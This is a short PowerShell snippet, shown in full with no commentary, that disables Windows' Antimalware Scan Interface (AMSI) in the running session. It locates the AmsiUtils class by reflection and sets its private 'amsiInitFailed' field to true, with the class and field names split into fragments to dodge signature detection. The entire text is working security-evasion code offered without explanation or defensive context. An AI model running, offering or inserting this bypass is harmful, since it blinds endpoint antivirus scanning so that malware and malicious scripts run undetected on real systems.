$a='si';
$b='Am';
$Ref=[Ref].Assembly.GetType(('System.Management.Automation.{0}{1}Utils'-f $b,$a));
$z=$Ref.GetField(('am{0}InitFailed'-f$a),'NonPublic,Static');
$z.SetValue($null,$true)
